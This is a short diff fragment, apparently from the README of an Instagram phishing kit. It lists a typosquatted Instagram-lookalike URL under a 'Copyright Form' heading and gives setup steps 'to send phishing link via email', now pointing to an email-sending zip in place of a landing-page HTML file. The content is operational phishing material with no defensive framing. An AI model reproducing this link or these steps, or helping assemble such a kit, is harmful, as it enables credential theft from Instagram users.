@@ -21,4 +21,5 @@ Copyright Form
 https://lnstaagram.netlify.app/
 
 To send phishing link via email
-download Instagram_Landing_Page.html connect it through a web page.
+download email-sending.zip
+
